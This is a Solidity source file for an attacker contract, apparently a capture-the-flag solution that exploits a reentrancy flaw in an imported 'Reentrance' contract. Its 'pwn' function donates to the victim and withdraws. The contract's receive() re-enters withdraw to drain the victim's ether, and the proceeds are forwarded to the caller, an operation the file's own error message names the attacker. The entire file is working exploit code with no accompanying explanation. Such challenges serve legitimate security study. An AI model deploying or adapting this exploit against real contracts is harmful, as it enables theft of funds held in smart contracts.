// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Reentrance} from "./Reentrance.sol";

contract Reentrant {
    bool locked;
    Reentrance victim;

    function pwn(Reentrance _victim) external payable {
        victim = _victim;
        uint256 victimBalance = address(victim).balance;
        require(msg.value >= victimBalance, "Incorrect amount sent");
        locked = false;
        victim.donate{value: victimBalance}(address(this));
        victim.withdraw(victimBalance);

        (bool success, ) = address(msg.sender).call{
            value: msg.value + victimBalance
        }("");
        require(success, "Failed to send ether to attacker");
    }

    receive() external payable {
        if (!locked) {
            locked = true;
            victim.withdraw(msg.value);
            locked = false;
        }
    }
}
